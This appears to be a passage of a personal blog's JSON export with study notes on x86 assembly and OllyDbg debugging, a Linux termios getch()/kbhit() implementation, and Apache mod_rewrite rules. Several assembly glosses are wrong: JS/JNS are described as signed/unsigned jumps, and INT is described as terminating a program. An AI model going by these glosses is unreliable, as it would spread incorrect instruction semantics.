ZF为0时跳转 JNZ ZF不为0时跳转 JS 有符号时跳转 JNS 无符号时跳转 JGE：Jump if Greater or Equal 循环指令 指令 作用 LOOP 循环（改变ECX的值） JCXZ 循环（不改变ECX的值） 串指令 指令 作用 MOVS[B/W/D] 传送字节串/字串/双字串 CMPS[B/W/D] 比较字节串/字串/双字串 SCAS[B/W/D] 扫描字节串/字串/双字串 LODS[B/W/D] 加载源变址字节串/字串/双字串 STOS[B/W/D] 保存字节串/字串/双字串 REP 重复 其他指令 指令 作用 INT 终止程序 CALL 调用函数 RET 过程返回 NOP 空 CLD 方向清零 OD初探静态调试与动态调试：静态调试就是在不执行程序的情况下，人工地对源代码的语法和逻辑分析；动态调试则是在编译、链接、运行的整个过程中，观察如寄存器内容、函数执行情况等状态来分析调试 L(og):日志信息 E(xecute modules):模块信息 M(emory map):内存映射信息 T(hreads):线程信息 W(indows):窗口信息 H(andles):句柄信息 C:当前线程上下文 K:调用链信息 …… OD调试快捷键 快捷键 功能 ctrl+g 跳转到指定位置 ctrl+e 编辑指定区域 space 编辑汇编代码 f4 执行到光标位置处 f2 断点（Int3） ; 添加注释 : 添加标签名 * 返回到正在运行的地方 -(+) 返回到上（下）一个光标处 enter 跟随跳转/跟入调用内部 f3 打开一个新的可执行程序 ctrl+f2 重新运行当前调试的程序 f9 运行选定的程序进行调试 f12 暂时停止被调试程序的执行 f7 单步进入被调试程序的call中 f8 步过被调试程序的call ctrl+f9 执行直到返回 第一次调试（helloworld.exe）关于PE文件的EntryPoint。打开CFF，将PE文件拖入： 其中，ImageBase和AddressOfEntryPoint指向的地址即为EntryPoint 找到main函数 代码执行：通过F7单步步入，一步一步执行到弹框跳出时，进入main函数 层层推进：通过F8单步步过，快速跳过每个函数，跳出弹框后，进入main函数 字符串检索：根据弹框上方的字符串，右键智能搜索查找，找到后直接进入main函数 API检索法：通过运行程序可以判断文件句柄是MessageBox，在模块中找到后依次设置断点，运行程序，在主函数断电处停下 特征法：根据C语言的反汇编特征进行判断 修改内容 Fact.exe jge表示大于或等于时跳转。当输入数字n时，EDX存放值n，ECX中的值初始化为1，[local.3]中的值也为1，每次循环时，ECX中的值自加一，[local.3]的值为自身再乘上ECX中的值。当ECX等于EDX时跳出循环，而不再进行下一次乘法，最后[local.3]中的值为(n-1)!，故应该将jge修改为jg即可 参考网站https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.htmlhttps://blog.csdn.net/qq_34717555/article/details/77727176https://blog.csdn.net/hanchaoman/article/details/9187093","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"Unix/Linux下实现Windows中conio.h头文件部分函数","slug":"Unix-Linux下实现Windows中conio-h头文件部分函数","date":"2018-06-19T13:38:18.000Z","updated":"2018-06-19T14:09:32.051Z","comments":true,"path":"2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","link":"","permalink":"https://qianfei11.github.io/2018/06/19/Unix-Linux下实现Windows中conio-h头文件部分函数/","excerpt":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。","text":"最近在写数据结构大作业，因为在写五子棋的时候不知道怎么实现通过键盘来实现移动和下子，了解到了windows下的conio.h头文件。但是由于我用的是unix系统，需要自己来实现。 主要实现getch()和kbhit()两个函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;termios.h&gt; //Linux专用头文件，用于实现getch()、kbhit()#include &lt;unistd.h&gt; //定义了大量针对系统调用的封装的接口 提供对 POSIX 操作系统 API 的访问功能#include &lt;fcntl.h&gt; //定义了很多宏和函数原型 对文件的打开、数据写入、数据读取、关闭文件的操作#include &lt;stdio.h&gt;int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125;int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; getch()1234567891011121314int getch() //输入不需要回车键便返回&#123; struct termios tm, tm_old; if(tcgetattr(STDIN_FILENO, &amp;tm) &lt; 0) //STDIN_FILENO是终端文件描述符，是一个打开文件句柄 return -1; tm_old = tm; cfmakeraw(&amp;tm); //设置串口属性 将终端设置成原始模式，此时终端是不可回显的 if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm) &lt; 0) //更改终端设置 return -1; int ch = getchar(); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;tm_old) &lt; 0) //恢复终端原始设置 return -1; return ch;&#125; termios结构体1234567struct termios&#123; tcflag_t c_iflag; /* Input modes */ tcflag_t c_oflag; /* Output modes */ tcflag_t c_cflag; /* Control modes */ tcflag_t c_lflag; /* Local modes */ cc_t c_cc[NCCS]; /* Control characters */&#125;; 格字段的选项如下： c_iflag 键值 说明 BRKINT 接到BREAK时产生SIGINT； ICRNL 将输入的CR转换为NL； IGNBRK 忽略BREAK条件； IGNCR 忽略CR； IGNPAR 忽略奇偶错字符； IMAXBEL 在输入队列空时振铃； INLCR 将输入的NL转换为CR； INPCK 打开输入奇偶校验； ISTRIP 剥除输入字符的第8位； IUCLC 将输入的大写字符转换成小写字符(仅SVR4)； IXANY 使任一字符都重新起动输出； IXOFF 使起动/停止输入控制流起作用； IXON 使起动/停止输出控制流起作用； PARMRK 标记奇偶错； c_oflag 键值 说明 BSDLY 退格延迟屏蔽(仅SVR4)； CRDLY CR延迟屏蔽(仅SVR4)； FFDLY 换页延迟屏蔽(仅SVR4)； NLDLY NL延迟屏蔽(仅SVR4)； OCRNL 将输出的CR转换为NL(仅SVR4)； OFDEL 填充符为DEL，否则为NUL(仅SVR4)； OFILL 对于延迟使用填充符(仅SVR4)； OLCUC 将输出的小写字符转换为大写字符(仅SVR4)； ONLCR 将NL转换为CR-NL； ONLRET NL执行CR功能(仅SVR4)； ONOCR 在0列不输出CR(仅SVR4)； ONOEOT 在输出中删除EOT字符(仅4.3+BSD)； OPOST 执行输出处理； OXTABS 将制表符扩充为空格(仅4.3+BSD)； TABDLY 水平制表符延迟屏蔽(仅SVR4)； VTDLY 垂直制表符延迟屏蔽(仅SVR4)； c_cflag 键值 说明 CCTS_OFLOW 输出的CTS流控制(仅4.3+BSD)； CIGNORE 忽略控制标志(仅4.3+BSD)； CLOCAL 忽略解制解调器状态行； CREAD 启用接收装置； CRTS_IFLOW 输入的RTS流控制(仅4.3+BSD)； CSIZE 字符大小屏蔽； CSTOPB 送两个停止位，否则为1位； HUPCL 最后关闭时断开； MDMBUF 经载波的流控输出(仅4.3+BSD)； PARENB 进行奇偶校； PARODD 奇校，否则为偶校； c_lflag 键值 说明 ALTWERASE 使用替换WERASE算法(仅4.3+BSD)； ECHO 进行回送； ECHOCTL 回送控制字符为^(char)； ECHOE 可见擦除符； ECHOK 回送kill符； ECHOKE kill的可见擦除； ECHONL 回送NL； ECHOPRT 硬拷贝的可见擦除方式； FLUSHO 刷清输出； ICANON 规范输入； IEXTEN 使扩充的输入字符处理起作用； ISIG 使终端产生的信号起作用； NOFLSH 在中断或退出键后不刷清； NOKERNINFO STATUS不使内核输出(仅4.3+BSD)； PENDIN 重新打印； TOSTOP 对于后台输出发送SIGTTOU； XCASE 规范大/小写表示(仅SVR4)； 各标志的含义如下： 标志 含义 ALTWERASE (c_lflag, 4.3+BSD)此标志设置时，若输入了WERASE字符，则使用一个替换的字擦除算法。它不是向后移动到前一个白空字符为止，而是向后移动到第一个非字母、数字符为止。 BRKINT (c_iflag, POSIX.1)若此标志设置，而IGNBRK未设置，则在接到BREAK时，输入、输出队列被刷清，并产生一个SIGINT信号。如果此终端设备是一个控制终端，则将此信号送给前台进程组各进程。如果IGNBRK和BRKINT都没有设置，但是设置了PARMRK，则BREAK被读作为三个字节序列/377，/0和/0，如果PARMRK也没有设置，则BREAK被读作为单个字符/0。 BSDLY (c_oflag, SVR4)退格延迟屏蔽，此屏蔽的值是BS0或BS1。 CCTS_OFLOW (c_cflag, 4.3+BSD)输出的CTS流控制。 CIGNORE (c_cflag, 4.3+BSD)忽略控制标志。 CLOCAL (c_cflag, POSIX.1)如若设置，则忽略调制解调器状态线。这通常意味着该设备是本地连接的。若此标志未设置，则打开一个终端设备常常会阻塞到调制解调器回应。 CRDLY (c_oflag, SVR4)回车延迟屏蔽。此屏蔽的值是CR0、CR1、CR2和CR3。 CREAD (c_cflag, POSIX.1)如若设置，则接收装置被启用，可以接收字符。 CRTS_IFLOW (c_cflag, 4.3+BSD)输入的RTS流控制。 CSIZE (c_cflag, POSIX.1)此字段是一个屏蔽标志，它指明发送和接收的每个字节的位数。此长度不包括可能有的奇偶校验位。由此屏蔽定义的字段值是CS5、CS6、CS7和CS8，分别表示每个字节包含5、6、7和8位。 CSTOPB (c_cflag, POSIX.1)如若设置，则使用两位作为停止位，否则只使用一位作为停止位。 ECHO (c_lflag, POSIX.1)如若设置，则将输入字符回送到终端设备。在规范方式和非规范方式下都可以回送字符。 ECHOCTL (c_lflag, SVR4和4.3+BSD)如若设置并且ECHO也设置，则除ASCII TAB、ASCII NL、START和STOP字符外，其他ASCII控制符(ASCII字符集中的0～037)都被回送为^X，其中，X是相应控制字符代码值加0100所构成的字符。这就意味着ASCII Ctrl-A字符(01)被回送为^A。ASCII DELETE字符(0177)则回送为^?。如若此标志未设置，则ASCII控制字符按其原样回送。如同ECHO标志，在规范方式和非规范方式下此标志对控制字符回送都起作用。应当了解的是，某些系统回送EOF字符产生的作用有所不同，其原因是EOF的典型值是Ctrl-D，而这是ASCII EOT字符，它可能使某些终端挂断。 ECHOE (c_lflag, POSIX.1)如若设置并且ICANON也设置，则ERASE字符从显示中擦除当前行中的最后一个字符。这通常是在终端驱动程序中写三个字符序列：退格，空格，退格实现的。如若支持WERASE字符，则ECHOE用一个或若干个上述三字符序列擦除前一个字。如若支持ECHOPRT标志，则在这里所说明的ECHOE动作假定ECHOPRT标志没有设置。 ECHOK (c_lflag, POSIX.1)如若设置并且ICANON也设置，则KILL字符从显示中擦除当前行，或者输出NL字符(用以强调已擦除整个行)。如若支持ECHOKE标志，则这里的说明假定ECHOKE标志没有设置。 ECHOKE (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON也设置，则回送KILL字符的方式是擦去行中的每一个字符。擦除每个字符的方法则由ECHOE和ECHOPRT标志选择。 ECHONL (c_lflag, POSIX.1)如若设置并且ICANON也设置，即使没有设置ECHO也回送NL字符。 ECHOPRT (c_lflag, SVR4和4.3+BSD)如若设置并且ICANON和ECHO也都设置，则ERASE字符(以及WERASE字符，若受到支持)使所有正被擦除的字符按它们被擦除的方式打印。在硬拷贝终端上这常常是有用的，这样可以确切地看到哪些字符正被擦去。 FFDLY (c_oflag, SVR4)换页延迟屏蔽。此屏蔽标志值是FF0或FF1。 FLUSHO (c_lflag, SVR4和4.3+BSD)如若设置，则刷清输出。当键入DISCARD字符时设置此标志，当键入另一个DISCARD字符时，此标志被清除。设置或清除此终端标志也可设置或清除此条件。 HUPCL (c_cflag, POSIX.1)如若设置，则当最后一个进程关闭此设备时，调制解调器控制线降至低电平(也就是调制解调器的连接断开)。 ICANON (c_lflag, POSIX.1)如若设置，则按规范方式工作。这使下列字符起作用：EOF、EOL、EOL2、ERASE、KILL、REPRINT、STATUS和WERASE。输入字符被装配成行。如果不以规范方式工作，则读请求直接从输入队列取字符。在至少接到MIN个字节或已超过TIME值之前，read将不返回。 ICRNL (c_iflag, POSIX.1)如若设置并且IGNCR未设置，即将接收到的CR字符转换成一个NL字符。 IEXTEN (c_lflag, POSIX.1)如若设置，则识别并处理扩充的、实现定义的特殊字符。 IGNBRK (c_iflag, POSIX.1)在设置时，忽略输入中的BREAK条件。关于BREAK条件是产生信号还是被读作为数据，请见BRKINT。 IGNCR (c_iflag, POSIX.1)如若设置，忽略接收到的CR字符。若此标志未设置，而设置了ICRNL标志则将接收到的CR字符转换成一个NL字符。 IGNPAR (c_iflag, POSIX.1)在设置时，忽略带有结构错误(非BREAK)或奇偶错的输入字节。 IMAXBEL (c_iflag, SVR4和4.3+BSD)当输入队列满时响铃。 INLCR (c_iflag, POSIX.1)如若设置，则接收到的NL字符转换成CR字符。 INPCK (c_iflag, POSIX.1)当设置时，使输入奇偶校验起作用。如若未设置INPCK，则使输入奇偶校验不起作用。奇偶“产生和检测”和“输入奇偶性检验”是不同的两件事。奇偶位的产生和检测是由PARENB标志控制的。设置该标志后使串行界面的设备驱动程序对输出字符产生奇偶位，对输入字符则验证其奇偶性。标志PARODD决定该奇偶性应当是奇还是偶。如果一个其奇偶性为错的字符已经来到，则检查INPCK标志的状态。若此标志已设置，则检查IGNPAR标志(以决定是否应忽略带奇偶错的输入字节)，若不应忽略此输入字节，则检查PARMRK标志以决定向读进程应传送那种字符。 ISIG (c_lflag, POSIX.1)如若设置，则判别输入字符是否是要产生终端信号的特殊字符(INTR，QUIT，SUSP和DSUSP)，若是，则产生相应信号。 ISTRIP (c_iflag, POSIX.1)当设置时，有效输入字节被剥离为7位。当此标志未设置时，则保留全部8位。 IUCLC (c_iflag, SVR4)将输入的大写字符映射为小写字符。 IXANY (c_iflag, SVR4和4.3+BSD)使任一字符都能重新起动输出。 IXOFF (c_iflag, POSIX.1)如若设置，则使起动-停止输入控制起作用。当终端驱动程序发现输入队列将要填满时，输出一个STOP字符。此字符应当由发送数据的设备识别，并使该设备暂停。此后，当已对输入队列中的字符进行了处理后，该终端驱动程序将输出一个START字符，使该设备恢复发送数据。 IXON (c_iflag, POSIX.1)如若设置，则使起动-停止输出控制起作用。当终端驱动程序接收到一个STOP字符时，输出暂停。在输出暂停时，下一个START字符恢复输出。如若未设置此标志，则START和STOP字符由进程读作为一般字符。 MDMBUF (c_cflag, 4.3+BSD)按照调制解调器的载波标志进行输出流控制。 NLDLY (c_oflag, SVR4)新行延迟屏蔽。此屏蔽的值是NL0和NL1。 NOFLSH (c_lflag, POSIX.1)按系统默认，当终端驱动程序产生SIGINT和SIGQUIT信号时，输入、出队列都被刷新。另外，当它产生SIGSUSP信号时，输入队列被刷新。如若设置了NOFLSH标志，则在这些信号产生时，不对输入、出队列进行刷新。 NOKERNINFO (c_lflag, 4.3+BSD)当设置时，此标志阻止STATUS字符使前台进程组的状态信息显示在终端上。但是不论本标志是否设置，STATUS字符使SIGINFO信号送至前台进程组中的所有进程。 OCRNL (c_oflag, SVR4)如若设置，将输出的CR字符映照为NL。 OFDEL (c_oflag, SVR4)如若设置，则输出填充字符是ASCII DEL，否则它是ASCII NUL，见OFILL标志。 OFILL (c_oflag, SVR4)如若设置，则为实现延迟，发送填充字符(ASCII DEL或ASCII NUL，见OFDEL标志)，而不使用时间延迟。见6个延迟屏蔽：BSDLY，CRDLY，FFDLY，NLDLY，TABDLY以及VTDLY。 OLCUC (c_oflag, SVR4)如若设置，将小写字符映射为大写。 ONLCR (c_oflag, SVR4和4.3+BSD)如若设置，将输出的NL字符映照为CR-NL。 ONLRET (c_oflag, SVR4)如若设置，则输出的NL字符将执行回车功能。 ONOCR (c_oflag, SVR4)如若设置，则在0列不输出CR。 ONOEOT (c_oflag, 4.3+BSD)如若设置，则在输出中删除EOT字符(^D)。在将Ctrl-D解释为挂断的终端上这可能是需要的。 OPOST (c_oflag, POSIX.1)如若设置，则进行实现定义的输出处理。 OXTABS (c_oflag, 4.3+BSD)如若设置，制表符在输出中被扩展为空格。这与将水平制表延迟(TABDLY)设置为XTABS或TAB3产生同样效果。 PARENB (c_cflag, POSIX.1)如若设置，则对输出字符产生奇偶位，对输入字符则执行奇偶性检验。若PARODD已设置，则奇偶校验是奇校验，否则是偶校验。也见INPCK、IGNPAR和PARMRK标志部分。 PARMRK (c_iflag, POSIX.1)，当设置时，并且IGNPAR未设置，则结构性错(非BREAK)和奇偶错的字节由进程读作为三个字符序列/377, /0和X，其中X是接收到的具有错误的字节。如若ISTRIP未设置，则一个有效的/377被传送给进程时为/377，/377。如若IGNPAR和PARMRK都未设置，则结构性错和奇偶错的字节都被读作为一个字符/0。 PARODD (c_cflag, POSIX.1)如若设置，则输出和输入字符的奇偶性都是奇，否则为偶。注意，PARENB标志控制奇偶性的产生和检测。 PENDIN (c_lflag, SVR4和4.3+BSD)如若设置，则在下一个字符输入时，尚未读的任何输入都由系统重新打印。这一动作与键入REPRINT字符时的作用相类似。 TABDLY (c_oflag, SVR4)水平制表延迟屏蔽。此屏蔽的值是TAB0、TAB1、TAB2或TAB3。XTABS的值等于TAB3。此值使系统将制表符扩展成空格。系统假定制表符所扩展的空格数到屏幕上最近一个8的倍数处为止。不能更改此假定。 TOSTOP (c_lflag, POSIX.1)如若设置，并且该实现支持作业控制，则将信号SIGTTOU送到试图与控制终端的一个后台进程的进程组。按默认，此信号暂停该进程组中所有进程。如果写控制终端的进程忽略或阻塞此信号，则终端驱动程序不产生此信号。 VTDLY (c_oflag, SVR4)垂直制表延迟屏蔽。此屏蔽的值是VT0或VT1。 XCASE (c_lflag, SVR4)如若设置，并且ICANON也设置，则认为终端是大写终端，所以输入都变换为小写。为了输入一个大写字符，在其前加一个/。与之类似，输出一个大写字符也在其前加一个/(这一标志已经过时，现在几乎所有终端都支持大、小写字符)。 cfmakeraw()cfmakeraw sets the terminal attributes as follows:12345termios_p-&gt;c_iflag &amp;= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL|IXON);termios_p-&gt;c_oflag &amp;= ~OPOST;termios_p-&gt;c_lflag &amp;= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);termios_p-&gt;c_cflag &amp;= ~(CSIZE|PARENB);termios_p-&gt;c_cflag |= CS8; 就是将终端设置为原始模式，该模式下所有的输入数据以字节为单位被处理。在原始模式下，终端是不可回显的，而且所有特定的终端输入/输出模式不可用。 POSIX终端接口很多系统都支持POSIX终端（串口）接口。程序可以利用这个接口来改变终端的参数，比如，波特率，字符大小等等。要使用这个端口的话，你必须将头文件包含到你的程序中。这个头文件中定义了终端控制结构体和POSIX控制函数。 与串口操作相关的最重要的两个POSIX函数可能就是tcgetattr()和tcsetattr()。顾名思义，这两个函数分别用来取得设设置终端的属性。 1、linux中的串口设备文件存放于/dev目录下，其中 串口一，串口二对应设备名依次为 “/dev/ttyS0”、“/dev/ttyS1”。在linux下操作串口与操作文件相同。 2、在使用串口之前必须设置相关配置，包括：波特率、 数据位、校验位、停止位等。串口设置由termios结构体实现。 常用的串口控制函数： 123456Tcgetattr 取属性(termios 结构)Tcsetattr 设置属性(termios 结构)cfgetispeed 得到输入速度Cfgetospeed 得到输出速度Cfsetispeed 设置输入速度Cfsetospeed 设置输出速度 3、串口的配置 (1)保存原先串口配置使用tcgetattr(fd,&amp; oldtio)函数： 12struct termiosnewtio,oldtio;tcgetattr(fd,&amp; oldtio); (2)激活选项有CLOCAL和CREAD,用于本地连接和接收使能。 1newtio.c_cflag|=CLOCAL|CREAD; (3)设置波特率，使用函数cfsetispeed、cfsetospeed 12cfsetispeed(&amp;newtio,B115200);cfsetospeed(&amp;newtio,B115200); (4)设置数据位，需使用掩码设置。 12newtio.c_cflag&amp;=~CSIZE;newtio.c_cflag|=CS8; (5)设置奇偶校验位，使用c_cflag和c_iflag。 设置奇校验： 123newtio.c_cflag|=PARENB; newtio.c_cflag|=PARODD;newtio.c_iflag|=(INPCK|ISTRIP); 设置偶校验： 123newtio.c_iflag|=(INPCK|ISIRIP);newtio.c_cflag|=PARENB;newtio.c_cflag&amp;=~PARODD; (6)设置停止位，通过激活c_cflag中的CSTOPB实现。若停止位为1，则清除CSTOPB，若停止位为 2，则激活CSTOPB。 1newtio.c_cflag&amp;=~CSTOPB; (7)设置最少字符和等待时间，对于接收字符和等待时间没有特别要求时，可设为0。 12newtio.c_cc[VTIME]=0;newtio.c_cc[VMIN]=0; (8)处理要写入的引用对象tcflush函数刷清（抛弃）输入缓存（终端驱动程序已接收到，但用户程序尚未读）或输出缓存（用户程序已经写，但尚未发送）。 1int tcflush(int filedes,int queue) queue数应当是下列三个常数之一： 123TCIFLUSH 刷清输入队列。TCOFLUSH刷清输出队列。TCIOFLUSH刷清输入、输出队列。 如：tcflush(fd,TCIFLUSH); (9)激活配置。在完成配置后，需激活配置使其生效。使用tsettattr()函数。原型： 12int tcgetattr(int filedes,struct termios *termptr);int tcsetattr(int filedes,int opt,const struct termios* termptr); tcsetattr的参数opt使我们可以指定在什么时候新的终端属性才起作用。opt可以指定为下列常数中的一个： TCSANOW更改立即发生。 TCSADRAIN发送了所有输出后更改才发生。若更改输出参数则应使用此选择项。 4 、在配置完串口的相关属性后，就可对串口进行打开,读写操作了。其使用方式与文件操作一样，区别在于串口是一个终端设备. (1)打开串口 1234fd=open(&quot;/dev/ttyS0&quot;,O_RDWR|O_NOCTTY |O_NDELAY);Open函数中除普通参数外,另有两个参数O_NOCTTY和O_NDELAY.O_NOCTTY:通知linux系统,这个程序不会成为这个端口的控制终端。O_NDELAY:通知linux系统不关心DCD信号线所处的状态(端口的另一端是否激活或者停止）。 (2)恢复串口的状态为阻塞状态,用于等待串口数据的读入。用fcntl函数: 1fcntl(fd,F_SETFL,0）; (3)接着,测试打开的文件描述府是否引用一个终端设备,以进一步确认串口是否正确打开. 1isatty(STDIN_FILENO); (4)串口的读写与普通文件一样,使用read,write函数. 12read(fd,buf,8);write(fd,buf,8); kbhit()1234567891011121314151617181920212223int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; fcntl()1、获取文件的flags，即open函数的第二个参数: 1flags = fcntl(fd,F_GETFL,0); 2、设置文件的flags: 1fcntl(fd,F_SETFL,flags); 3、增加文件的某个flags，比如文件是阻塞的，想设置成非阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags |= O_NONBLOCK;fcntl(fd,F_SETFL,flags); 4、取消文件的某个flags，比如文件是非阻塞的，想设置成为阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags &amp;= ~O_NONBLOCK;fcntl(fd,F_SETFL,flags); 参考网站：https://blog.csdn.net/g1036583997/article/details/41277949https://www.cnblogs.com/dartagnan/archive/2013/04/25/3042417.htmlhttps://blog.csdn.net/DiegoTJ/article/details/5454917https://gezhenzhen.wikispaces.com/Linux%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86http://www.codexiu.cn/linux/blog/21923/https://blog.csdn.net/liangxiaozhang/article/details/8202965","categories":[],"tags":[{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"},{"name":"linux","slug":"linux","permalink":"https://qianfei11.github.io/tags/linux/"}]},{"title":"Apache Rewrite（路由重写）","slug":"Apache-Rewrite（路由重写）","date":"2018-05-16T05:36:06.000Z","updated":"2019-02-03T10:23:57.833Z","comments":true,"path":"2018/05/16/Apache-Rewrite（路由重写）/","link":"","permalink":"https://qianfei11.github.io/2018/05/16/Apache-Rewrite（路由重写）/","excerpt":"Apache Rewrite能够实现URL的跳转和隐藏真实地址。它基于Perl语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。","text":"Apache Rewrite能够实现URL的跳转和隐藏真实地址。它基于Perl语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。 理解Apache Rewrite的三个核心RewriteEngine这个是rewrite功能的总开关，用来开启是否启动url rewrite。 1RewriteEngine on RewriteCondRewriteCond就是一个过滤条件，简单来说，当URL满足RewriteCond配置的条件的情况，就会执行RewriteCond下面紧邻的RewriteRule语句。 RewriteCond 和 RewriteRule 是上下对应的关系。可以有1个或者好几个RewriteCond来匹配一个RewriteRule。 RewriteCond %{待测试项目} 正则表达式条件。 123RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^Mozilla//5/.0.*RewriteRule index.php index.m.php 如果设置上面的匹配规则，到来的http请求中的HTTP_USER_AGENT匹配^Mozilla//5/.0.*正则表达式的话，则执行下面的RewriteRule，也就是说访问路径会跳转到index.m.php这个文件。 RewriteRule1RewriteRule Pattern Substitution [flags] Pattern是一个正则匹配。Substitution是匹配的替换 [flags]是一些参数限制。 1RewriteRule ^room/video/(\\d+)\\.html web/index\\.php?c=room&amp;a=video&amp;r=$1 [QSA,NC,L] 意思是 以 room开头的room/video/123.html这样子，变成web/index.php?c=room&amp;a=video&amp;r=123。 1RewriteRule \\.(jpg|gif) http://image.baidu.com/ [R,NC,L] 意思是以为是访问.jpg或者gif的文件，都会调整到http://image.baidu.com。 重写规则的作用范围1) 可以使用在Apache主配置文件httpd.conf中。 2) 可以使用在httpd.conf里定义的虚拟主机配置中。 3) 可以使用在基本目录的跨越配置文件.htaccess中。 这三种方式，都需要在写规则前，用“RewriteEngine on”指令来打开rewrite功能。 Apache Rewrite规则修正符1) R=code 强制外部重定向 强制在替代字符串加上http://thishost[:thisport]/前缀重定向到外部的URL。如果code不指定，将用缺省的302 HTTP状态码。 1) F(force URL to be forbidden)禁用URL,返回403HTTP状态码。 2) G(force URL to be gone) 强制URL为GONE，返回410HTTP状态码。 3) P(force proxy) 强制使用代理转发。 4) L(last rule) 表明当前规则是最后一条规则，停止分析以后规则的重写。 5) N(next round) 重新从第一条规则开始运行重写过程。 6) C(chained with next rule) 与下一条规则关联 如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。 1) T=MIME-type(force MIME type) 强制MIME类型。 2) NS (used only if no internal sub-request) 只用于不是内部子请求。 3) NC(no case) 不区分大小写。 4) QSA(query string append) 追加请求字符串。 5) NE(no URI escaping of output) 不在输出转义特殊字符。 例如： 1RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] #将能正确的将/foo/zoo转换成/bar?arg=P1=zoo 13) PT(pass through to next handler) 传递给下一个处理。 例如： 12RewriteRule ^/abc(.*) /def$1 [PT] # 将会交给/def规则处理Alias /def /ghi 14) S=num(skip next rule(s)) 跳过num条规则。 15) E=VAR:VAL(set environment variable) 设置环境变量。 注：P是代理模式转发，必须用url全称，并且要保证modProxy打开，也就是下面httpd.conf中的如下两个指令： 12LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so 如果对应proxy模块没加载，则会出现403禁止页面。 特殊字符的含义*代表前面0或更多个字符。 +代表前面1或更多个字符。 ？代表前面0或1个字符。 ^代表字符串的开始位置。 $代表字符串结束的位置。 。为通配符，代表任何字符。 \\将跟在其后的字符还原为字符本身，例如“+”代表的就是“+”，而非其它意思。 ^在方括号里表示非的意思。例如［^.］代表非通配符。 htaccess.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 Apache Rewrite的方式将apache的配置文件httpd.conf中 